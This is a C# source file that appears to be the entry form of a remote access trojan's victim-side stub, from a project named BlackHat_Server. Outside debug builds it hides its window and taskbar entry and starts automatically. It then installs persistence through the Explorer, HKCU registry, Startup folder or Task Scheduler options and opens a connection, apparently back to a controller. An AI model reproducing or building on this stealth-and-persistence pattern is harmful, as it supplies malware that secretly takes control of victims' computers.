using System;
using System.Windows.Forms;
using BlackHat_Server.Class;

namespace BlackHat_Server
{
    public partial class Host : Form
    {
        public Host()
        {
            InitializeComponent();
        }

        private void Host_Load(object sender, EventArgs e)
        {
            // VERSIONE DEL SERVER
            ST_Client.Instance.ServerVersion = "0.1.2";

#if !DEBUG
            Hide();
            ShowInTaskbar = false;
            
            StartSrv();
#endif
        }


        private void button1_Click(object sender, EventArgs e)
        {
            StartSrv();
        }


        private void StartSrv()
        {
            // INSTALLAZIONE SERVER
            if (ST_Client.Instance.bUseExplorer || ST_Client.Instance.bUseHKCU ||
                ST_Client.Instance.bUseStartupFolder || ST_Client.Instance.UseTaskScheduler)
            {
                var ins = new InstallClass();
                ins.StartInstallTHread();
            }
            //-----------------------------------------------


            // START SERVER
            var con = new Connection();
            con.StartServer();
        }


        private void Host_FormClosing(object sender, FormClosingEventArgs e)
        {
        }
    }
}